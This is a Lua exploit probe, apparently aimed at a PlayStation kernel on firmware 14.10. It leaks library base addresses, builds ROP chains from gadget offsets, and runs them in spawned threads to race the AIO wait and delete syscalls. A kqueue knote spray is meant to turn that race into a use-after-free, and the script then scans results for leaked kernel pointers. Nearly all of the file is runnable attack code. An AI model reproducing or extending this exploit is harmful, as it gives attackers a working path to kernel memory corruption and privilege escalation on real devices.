-- CRASH_CLASS: HIGH
-- PROBE 556b: wait(663) on in-flight AIO + kqueue knote spray
--
-- 541d proved: wait(663) has NO revalidation on 14.10 (Sony patched delete
-- but missed wait and cancel). With AIO spray → scheduler corruption (DoS).
--
-- Key hypothesis: AIO spray = DoS because kernel confuses two valid AIO entries.
-- NON-AIO spray (knotes) = kernel interprets knote fields as AIO pointers →
-- possible UAF, function pointer corruption, or kernel pointer leak.
--
-- Model:
-- 1. Submit 32 AIO reads on socketpairs (IN-FLIGHT — blocking)
-- 2. Child A (ROP): wait(663) one-by-one with NOP padding
-- 3. Child B (ROP): delete(662) one-by-one (frees entries → slot available)
-- 4. Main thread: kqueue knote spray (fills freed slots)
--
-- Wait(663) without revalidation blindly accesses whatever is in the slot.
-- If it's a knote → reads knote function pointers as AIO fields → ???
--
-- Monitoring: kernel pointers in any output, crash behavior, kqueue corruption

print("=== PROBE 556b: WAIT+KNOTE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", N(v))
end

local Z = uint64(0)
local sc6   = mk(6)
local sc20  = mk(20)
local sc135 = mk(135)
local sc240 = mk(240)
local sc362 = mk(362)
local sc363 = mk(363)
local sc455 = mk(455)
local sc477 = mk(477)
local sc662 = mk(662)
local sc663 = mk(663)
local sc664 = mk(664)
local sc669 = mk(669)
local sc670 = mk(670)

local pid = N(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax   = eb + uint64(0x992)
local pop_rdi   = eb + uint64(0xC9DFE)
local pop_rsi   = eb + uint64(0xD77D)
local pop_rdx   = eb + uint64(0x3B02D7)
local pop_rcx   = eb + uint64(0xE64)
local mov_m_rax = eb + uint64(0x92C67)
local bare_ret  = eb + uint64(0x42)
local fn_addr   = lk + uint64(0xB57)

pcall(function() sc670(Z, Z, Z, Z, Z, Z) end)

-- ============================================================
-- Shared memory layout (0x8000 bytes)
-- +0x000: deleter_done (dword)
-- +0x004: waiter_done (dword)
-- +0x010: delete_statuses[32] (dwords)
-- +0x100: wait_statuses[32] (dwords)
-- +0x200: ids[32] (dwords)
-- +0x300: wait_output[32*8] (qwords — whatever wait writes)
-- +0x900: zero_timespec (16 bytes)
-- ============================================================

local ok_sh, shared = pcall(function()
    return sc477(Z, uint64(0x8000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
zero(shared, 0x2000)
local sn = N(shared)
print("shared=" .. q(shared))

local NUM = 32
local NOP_PAD = 6

-- Kqueue
local ok_kq, kq_raw = pcall(function() return sc362() end)
local kq_fd = ok_kq and N(kq_raw) or -1
print("kqueue=" .. kq_fd)
if kq_fd < 0 then print("KQUEUE FAILED"); return end

-- ============================================================
-- Helpers
-- ============================================================
local reqs_buf = memory.alloc(0x30)
local ids_out  = memory.alloc(8)

local function aio_submit_read(fd)
    local db = memory.alloc(32)
    local rb = memory.alloc(16)
    zero(reqs_buf, 0x28)
    wq(reqs_buf + 0x08, uint64(16))
    wq(reqs_buf + 0x10, uint64(N(db)))
    wq(reqs_buf + 0x18, uint64(N(rb)))
    wd(reqs_buf + 0x20, fd)
    wd(ids_out, 0)
    local ok, rv = pcall(function()
        return sc669(uint64(1), uint64(N(reqs_buf)), uint64(1), uint64(1), uint64(N(ids_out)))
    end)
    return (ok and N(rv) or -999), (rd(ids_out) or 0)
end

local function aio_poll_one(id)
    local ip = memory.alloc(4); wd(ip, id)
    local sp = memory.alloc(4); wd(sp, 0x77777777)
    pcall(function() sc664(uint64(N(ip)), uint64(1), uint64(N(sp))) end)
    return rd(sp) or 0
end

local function aio_delete_one(id)
    local ip = memory.alloc(4); wd(ip, id)
    local sp = memory.alloc(4); wd(sp, 0x77777777)
    pcall(function() sc662(uint64(N(ip)), uint64(1), uint64(N(sp))) end)
    return rd(sp) or 0
end

local function make_tcb()
    local ok_t, p = pcall(function()
        return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    for toff = 0, 0x100, 8 do wq(p + toff, p) end
    local ptr = memory.alloc(8); wq(ptr, p)
    return ptr
end

-- ============================================================
-- Build deleter chain (frees entries to create spray opportunity)
-- Runs first with short delay, then finishes before waiter
-- ============================================================
local function build_deleter()
    local map_size = 0x400000
    local ok_m, base = pcall(function()
        return sc477(Z, uint64(map_size), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    local base_n = N(base)
    local tcb = make_tcb()
    local mid = base_n + (map_size / 2)
    local wp = mid - 8
    local off = 0
    local function emit(v) wq(uint64(wp + off), v); off = off + 8 end

    emit(pop_rax); emit(uint64(165))
    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(tcb)
    emit(fn_addr)

    -- Short startup delay (5 NOPs)
    for pad = 1, 5 do
        emit(pop_rax); emit(uint64(20))
        emit(pop_rdi); emit(Z)
        emit(fn_addr)
    end

    -- Delete one-by-one
    for i = 0, NUM - 1 do
        local id_addr = uint64(sn + 0x200 + i * 4)
        local st_addr = uint64(sn + 0x010 + i * 4)

        emit(pop_rax); emit(uint64(662))
        emit(pop_rdi); emit(id_addr)
        emit(pop_rsi); emit(uint64(1))
        emit(pop_rdx); emit(st_addr)
        emit(fn_addr)

        -- Minimal NOPs — we want deleter to be FAST
        for p = 1, 3 do
            emit(pop_rax); emit(uint64(20))
            emit(pop_rdi); emit(Z)
            emit(fn_addr)
        end
    end

    emit(pop_rax); emit(uint64(0xDE1E))
    emit(pop_rdi); emit(uint64(sn))
    emit(mov_m_rax)

    emit(pop_rax); emit(uint64(431))
    emit(pop_rdi); emit(Z)
    emit(fn_addr)

    local tp = memory.alloc(0x40); zero(tp, 0x40)
    wq(tp, bare_ret)
    wq(tp + 0x10, base)
    wq(tp + 0x18, uint64(map_size / 2 + 8))
    return tp, off
end

-- ============================================================
-- Build waiter chain (the VICTIM — no revalidation)
-- Runs with longer startup delay so deleter frees some entries first
-- ============================================================
local function build_waiter()
    local map_size = 0x400000
    local ok_m, base = pcall(function()
        return sc477(Z, uint64(map_size), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    local base_n = N(base)
    local tcb = make_tcb()
    local mid = base_n + (map_size / 2)
    local wp = mid - 8
    local off = 0
    local function emit(v) wq(uint64(wp + off), v); off = off + 8 end

    emit(pop_rax); emit(uint64(165))
    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(tcb)
    emit(fn_addr)

    -- Longer startup delay (30 NOPs) — let deleter start freeing
    for pad = 1, 30 do
        emit(pop_rax); emit(uint64(20))
        emit(pop_rdi); emit(Z)
        emit(fn_addr)
    end

    -- Zero timespec at shared+0x900
    local timeout_ptr = uint64(sn + 0x900)

    -- Wait one-by-one — 663(ids_ptr, 1, out_ptr, timeout_ptr)
    for i = 0, NUM - 1 do
        local id_addr = uint64(sn + 0x200 + i * 4)
        local st_addr = uint64(sn + 0x100 + i * 4)

        emit(pop_rax); emit(uint64(663))
        emit(pop_rdi); emit(id_addr)
        emit(pop_rsi); emit(uint64(1))
        emit(pop_rdx); emit(st_addr)
        emit(pop_rcx); emit(timeout_ptr)
        emit(fn_addr)

        for p = 1, NOP_PAD do
            emit(pop_rax); emit(uint64(20))
            emit(pop_rdi); emit(Z)
            emit(fn_addr)
        end
    end

    emit(pop_rax); emit(uint64(0x1A17))
    emit(pop_rdi); emit(uint64(sn + 4))
    emit(mov_m_rax)

    emit(pop_rax); emit(uint64(431))
    emit(pop_rdi); emit(Z)
    emit(fn_addr)

    local tp = memory.alloc(0x40); zero(tp, 0x40)
    wq(tp, bare_ret)
    wq(tp + 0x10, base)
    wq(tp + 0x18, uint64(map_size / 2 + 8))
    return tp, off
end

-- ============================================================
-- [A] Create socketpairs + submit blocking AIO reads
-- ============================================================
print("")
print("[A] Submit " .. NUM .. " blocking AIO reads")

local r_fds = {}
local w_fds = {}
local sv = memory.alloc(8)
local good = 0

for i = 1, NUM do
    wd(sv, 0xFFFFFFFF); wd(sv + 4, 0xFFFFFFFF)
    local ok_sp, rv_sp = pcall(function()
        return sc135(uint64(1), uint64(2), uint64(0), uint64(N(sv)))
    end)
    local f0 = rd(sv) or -1
    local f1 = rd(sv + 4) or -1
    if ok_sp and N(rv_sp) == 0 and f0 >= 0 and f1 >= 0 then
        good = good + 1
        r_fds[good] = f0
        w_fds[good] = f1
    end
end
print("  socketpairs=" .. good)

local orig_ids = {}
local ok_count = 0
for i = 1, good do
    local rv, id = aio_submit_read(r_fds[i])
    if rv == 0 and id > 0 then
        ok_count = ok_count + 1
        orig_ids[ok_count] = id
    end
end
print("  submitted=" .. ok_count)

-- Verify in-flight
local pending = 0
for i = 1, ok_count do
    local st = aio_poll_one(orig_ids[i])
    if st ~= 3 and st ~= 0x10003 then pending = pending + 1 end
end
print("  pending=" .. pending .. "/" .. ok_count)

if pending < 8 then
    print("TOO FEW PENDING — abort")
    for i = 1, good do
        pcall(function() sc6(uint64(r_fds[i])) end)
        pcall(function() sc6(uint64(w_fds[i])) end)
    end
    return
end

-- Write IDs and zero timespec
for i = 1, ok_count do
    wd(sn + 0x200 + (i-1) * 4, orig_ids[i])
    wd(sn + 0x010 + (i-1) * 4, 0x77777777)
    wd(sn + 0x100 + (i-1) * 4, 0x77777777)
end
wd(sn, 0); wd(sn + 4, 0)
wq(shared + 0x900, Z)
wq(shared + 0x908, Z)

-- ============================================================
-- [B] Race: deleter + waiter children + kqueue spray
-- ============================================================
print("")
print("[B] Race: deleter + waiter + kqueue spray")

local tp_del, csz_del = build_deleter()
local tp_wait, csz_wait = build_waiter()
print("  deleter chain=" .. csz_del .. "B")
print("  waiter chain=" .. csz_wait .. "B")

-- Launch deleter first (short delay)
pcall(function() sc455(uint64(N(tp_del)), uint64(0x38)) end)
-- Launch waiter (longer delay — gives deleter head start)
pcall(function() sc455(uint64(N(tp_wait)), uint64(0x38)) end)

-- Main thread: kqueue knote spray
local changelist = memory.alloc(0x40)
local SPRAY = 400
local spray_ok = 0

for i = 1, SPRAY do
    wq(changelist, uint64(i))
    wd(changelist + 8, 0x0001FFF9)
    wd(changelist + 12, 0)
    wq(changelist + 16, uint64(999999))
    wq(changelist + 24, uint64(0xBEEF0000 + i))
    local ok_r = pcall(function()
        sc363(uint64(kq_fd), uint64(N(changelist)), uint64(1), uint64(0), uint64(0), uint64(0))
    end)
    if ok_r then spray_ok = spray_ok + 1 end
end
print("  kqueue spray=" .. spray_ok)

-- Wait for children
local ts = memory.alloc(16)
wq(ts, uint64(3)); wq(ts + 8, Z)
for w = 1, 20 do
    local d_done = rd(sn) or 0
    local w_done = rd(sn + 4) or 0
    if d_done ~= 0 and w_done ~= 0 then break end
    pcall(function() sc240(uint64(N(ts)), Z) end)
end

local d_done = rd(sn) or 0
local w_done = rd(sn + 4) or 0
print(string.format("  deleter=0x%X waiter=0x%X", d_done, w_done))

if w_done == 0 then
    print("  *** WAITER STUCK — wait(663) may be blocking on knote! ***")
    print("  this means wait is interacting with a non-AIO object")
end

-- ============================================================
-- [C] Analyze results
-- ============================================================
print("")
print("[C] Delete statuses:")
local del_map = {}
for i = 0, ok_count - 1 do
    local st = rd(sn + 0x010 + i * 4) or 0
    local key = string.format("0x%08X", st)
    del_map[key] = (del_map[key] or 0) + 1
end
for k, v in pairs(del_map) do print("  " .. k .. " x" .. v) end

print("")
print("[C] Wait statuses:")
local wait_map = {}
for i = 0, ok_count - 1 do
    local st = rd(sn + 0x100 + i * 4) or 0
    local key = string.format("0x%08X", st)
    wait_map[key] = (wait_map[key] or 0) + 1
end
for k, v in pairs(wait_map) do print("  " .. k .. " x" .. v) end

-- ============================================================
-- [D] Kqueue health — look for corrupted events
-- ============================================================
print("")
print("[D] Kqueue health")

local eventlist = memory.alloc(0x2000)
local to_buf = memory.alloc(16)
wq(to_buf, Z); wq(to_buf + 8, Z)

local ok_ev, nev_raw = pcall(function()
    return sc363(uint64(kq_fd), uint64(0), uint64(0),
        uint64(N(eventlist)), uint64(32), uint64(N(to_buf)))
end)
local nev = ok_ev and N(nev_raw) or -999
print("  events=" .. nev)

local kptrs = 0
local anomalies = 0
if nev > 0 then
    for ei = 0, math.min(nev, 31) - 1 do
        local bo = ei * 32
        local id_lo = rd(eventlist + bo) or 0
        local id_hi = rd(eventlist + bo + 4) or 0
        local ud_lo = rd(eventlist + bo + 24) or 0
        local ud_hi = rd(eventlist + bo + 28) or 0

        local function ck(name, hi, lo)
            local uhi = hi
            if uhi < 0 then uhi = uhi + 0x100000000 end
            if uhi >= 0xFFFF8000 and uhi < 0xFFFFFFFF then
                kptrs = kptrs + 1
                if kptrs <= 5 then
                    print(string.format("  *** KPTR ev[%d] %s=0x%08X%08X ***", ei, name, hi, lo))
                end
            end
        end
        ck("ident", id_hi, id_lo)
        ck("udata", ud_hi, ud_lo)

        if id_hi ~= 0 or id_lo < 1 or id_lo > SPRAY then
            anomalies = anomalies + 1
            if anomalies <= 3 then
                print(string.format("  ANOMALY ev[%d] ident=0x%08X%08X", ei, id_hi, id_lo))
            end
        end
    end
end
print(string.format("  kptrs=%d anomalies=%d", kptrs, anomalies))

-- ============================================================
-- [E] Cleanup
-- ============================================================
print("")
print("[E] Cleanup")

-- Delete kqueue events
local del_kq = 0
for i = 1, spray_ok do
    wq(changelist, uint64(i))
    wd(changelist + 8, 0x0002FFF9)
    wd(changelist + 12, 0); wq(changelist + 16, Z); wq(changelist + 24, Z)
    local ok_d = pcall(function()
        sc363(uint64(kq_fd), uint64(N(changelist)), uint64(1), uint64(0), uint64(0), uint64(0))
    end)
    if ok_d then del_kq = del_kq + 1 end
end
pcall(function() sc6(uint64(kq_fd)) end)
print("  kqueue events deleted=" .. del_kq)

-- Close socketpairs
for i = 1, good do
    pcall(function() sc6(uint64(r_fds[i])) end)
    pcall(function() sc6(uint64(w_fds[i])) end)
end

-- Try to clean AIO
for i = 1, ok_count do
    pcall(function() aio_delete_one(orig_ids[i]) end)
end

print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))
print("=== 556b DONE ===")
